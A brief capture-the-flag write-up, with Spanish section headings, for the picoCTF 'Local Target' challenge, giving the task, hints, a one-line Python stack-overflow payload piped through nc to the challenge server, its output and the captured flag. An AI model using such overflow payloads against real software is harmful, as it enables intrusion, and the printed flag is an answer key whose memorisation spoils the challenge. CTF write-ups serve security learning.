# Local Target

## Descripción
Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using: `nc saturn.picoctf.net 61316`

## Pistas
- Do anything you can to change `num`.
- When you change `num`, view the value as hexadecimal.

## Solución

```
eltetor14-picoctf@webshell:~$ python -c "print('A'*24 + '\x41')" | nc saturn.picoctf.net 61316
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
eltetor14-picoctf@webshell:~$ 
```

## Bandera
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}

## Notas adicionales

## Referencias
